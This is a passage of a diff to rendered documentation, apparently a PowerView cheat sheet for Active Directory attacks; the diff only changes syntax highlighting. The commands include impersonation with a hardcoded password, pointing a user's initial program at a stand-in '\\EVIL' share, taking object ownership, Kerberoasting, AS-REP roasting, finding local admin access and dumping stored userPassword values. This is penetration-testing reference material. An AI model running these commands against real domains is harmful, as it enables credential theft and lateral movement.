+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;Password123!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;TESTLAB\dfm.a&#39;</span><span class="p">,</span><span class="nv">$SecPassword</span><span class="p">);</span> <span class="nb">Invoke-UserImpersonation</span> <span class="n">-Credential</span> <span class="nv">$Cred</span>
 </span></code></pre></div>
 - Revert impersonation back to self.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>Invoke-RevertToSelf
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a><span class="nb">Invoke-RevertToSelf</span>
 </span></code></pre></div></p>
 <p>Object outliers, setters, ownership
 - Detect outlier properties across computer objects.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a><span class="nb">Get-DomainComputer</span> <span class="n">-FindOne</span> <span class="p">|</span> <span class="nb">Find-DomainObjectPropertyOutlier</span>
 </span></code></pre></div>
 - Set arbitrary attributes on an AD object.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>Set-DomainObject testuser -Set @{&#39;mstsinitialprogram&#39;=&#39;\\EVIL\program.exe&#39;} -Verbose
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a><span class="nb">Set-DomainObject</span> <span class="n">testuser</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;mstsinitialprogram&#39;</span><span class="p">=</span><span class="s1">&#39;\\EVIL\program.exe&#39;</span><span class="p">}</span> <span class="n">-Verbose</span>
 </span></code></pre></div>
 - Take or set ownership of an AD object.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a><span class="nb">Set-DomainObjectOwner</span> <span class="n">-Identity</span> <span class="n">dfm</span> <span class="n">-OwnerIdentity</span> <span class="n">harmj0y</span>
 </span></code></pre></div></p>
 <p>Kerberoasting and AS-REP roast
 - Kerberoast using defaults (prints TGS hashes).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>Invoke-Kerberoast
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a><span class="nb">Invoke-Kerberoast</span>
 </span></code></pre></div>
 - Kerberoast a specific account, Hashcat format.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>Invoke-Kerberoast -Identity &quot;svc_sql&quot; -OutputFormat Hashcat
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a><span class="nb">Invoke-Kerberoast</span> <span class="n">-Identity</span> <span class="s2">&quot;svc_sql&quot;</span> <span class="n">-OutputFormat</span> <span class="n">Hashcat</span>
 </span></code></pre></div>
 - Kerberoast scoped to a specific OU/SearchBase.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>Invoke-Kerberoast -SearchBase &quot;LDAP://OU=secret,DC=testlab,DC=local&quot; -OutputFormat Hashcat
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a><span class="nb">Invoke-Kerberoast</span> <span class="n">-SearchBase</span> <span class="s2">&quot;LDAP://OU=secret,DC=testlab,DC=local&quot;</span> <span class="n">-OutputFormat</span> <span class="n">Hashcat</span>
 </span></code></pre></div>
 - List AS-REP roastable users (no preauth).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">samaccountname</span>
 </span></code></pre></div>
 - Request AS-REP roast for a specific user.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>Invoke-ASREPRoast -UserName jdoe -Verbose
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a><span class="nb">Invoke-ASREPRoast</span> <span class="n">-UserName</span> <span class="n">jdoe</span> <span class="n">-Verbose</span>
 </span></code></pre></div></p>
 <p>Local admin reachability
 - Threaded probe to find where you’re local admin (SMB/RPC).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>Find-LocalAdminAccess
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a><span class="nb">Find-LocalAdminAccess</span>
 </span></code></pre></div>
 - Test admin access to a single host.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>Test-AdminAccess -ComputerName WS01
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a><span class="nb">Test-AdminAccess</span> <span class="n">-ComputerName</span> <span class="n">WS01</span>
 </span></code></pre></div></p>
 <p>Turn short names into FQDNs via GC
 - Resolve bare hostnames to FQDNs using the global catalog.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>gc .\computers.txt | % { Get-DomainComputer -SearchBase &quot;GC://GLOBAL.CATALOG&quot; -LDAP &quot;(name=$_) &quot; -Properties dnshostname }
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a><span class="nb">gc </span><span class="p">.\</span><span class="n">computers</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nb">Get-DomainComputer</span> <span class="n">-SearchBase</span> <span class="s2">&quot;GC://GLOBAL.CATALOG&quot;</span> <span class="n">-LDAP</span> <span class="s2">&quot;(name=$_) &quot;</span> <span class="n">-Properties</span> <span class="n">dnshostname</span> <span class="p">}</span>
 </span></code></pre></div></p>
 <p>Data export/import
 - Export objects to XML for offline analysis.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>Get-DomainUser | Export-Clixml .\users.xml
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a><span class="nb">Get-DomainUser</span> <span class="p">|</span> <span class="nb">Export-Clixml</span> <span class="p">.\</span><span class="n">users</span><span class="p">.</span><span class="n">xml</span>
 </span></code></pre></div>
 - Re-import exported PowerView objects.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>$Users = Import-Clixml .\users.xml
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a><span class="nv">$Users</span> <span class="p">=</span> <span class="nb">Import-Clixml</span> <span class="p">.\</span><span class="n">users</span><span class="p">.</span><span class="n">xml</span>
 </span></code></pre></div></p>
 <p>Password attribute probe (rare, but occasionally exposed)
 - Dump userPassword attribute (if present) and render ASCII.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>$FormatEnumerationLimit=-1; Get-DomainUser -LDAPFilter &#39;(userPassword=*)&#39; -Properties samaccountname,memberof,userPassword | % { Add-Member -InputObject $_ NoteProperty &#39;Password&#39; &quot;$([System.Text.Encoding]::ASCII.GetString($_.userPassword))&quot; -PassThru } | fl
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a><span class="nv">$FormatEnumerationLimit</span><span class="p">=-</span><span class="n">1</span><span class="p">;</span> <span class="nb">Get-DomainUser</span> <span class="n">-LDAPFilter</span> <span class="s1">&#39;(userPassword=*)&#39;</span> <span class="n">-Properties</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">memberof</span><span class="p">,</span><span class="n">userPassword</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nb">Add-Member</span> <span class="n">-InputObject</span> <span class="nv">$_</span> <span class="n">NoteProperty</span> <span class="s1">&#39;Password&#39;</span> <span class="s2">&quot;</span><span class="p">$(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">userPassword</span><span class="p">))</span><span class="s2">&quot;</span> <span class="n">-PassThru</span> <span class="p">}</span> <span class="p">|</span> <span class="nb">fl</span>
 </span></code></pre></div></p>
 <p>Common pipelines and counts
 - Count total domain users quickly.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>(Get-DomainUser).Count
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a><span class="p">(</span><span class="nb">Get-DomainUser</span><span class="p">).</span><span class="n">Count</span>
 </span></code></pre></div>
 - Find non-empty user description fields.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>Get-DomainUser -Properties samaccountname,description | ? { $_.description -ne $null }
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Properties</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">description</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">description</span> <span class="o">-ne</span> <span class="nv">$null</span> <span class="p">}</span>
 </span></code></pre></div></p>
 <p>Process enumeration (not a PowerView function)
 PowerView 3.x has no Get-NetProcess; use native remoting/WMI/CIM:
 - Get processes on a remote host via WinRM (PowerShell remoting).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>Invoke-Command -ComputerName WS01 -ScriptBlock { Get-Process } -Credential $Cred
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">WS01</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">Get-Process</span> <span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$Cred</span>
 </span></code></pre></div>
 - Query processes via CIM (WSMan) on a remote host.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>Get-CimInstance Win32_Process -ComputerName WS01 -Credential $Cred
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a><span class="nb">Get-CimInstance</span> <span class="n">Win32_Process</span> <span class="n">-ComputerName</span> <span class="n">WS01</span> <span class="n">-Credential</span> <span class="nv">$Cred</span>
 </span></code></pre></div>
 - Query processes via legacy WMI (DCOM) on a remote host.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>Get-WmiObject Win32_Process -ComputerName WS01 -Credential $Cred
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a><span class="nb">Get-WmiObject</span> <span class="n">Win32_Process</span> <span class="n">-ComputerName</span> <span class="n">WS01</span> <span class="n">-Credential</span> <span class="nv">$Cred</span>
 </span></code></pre></div></p>
 
 
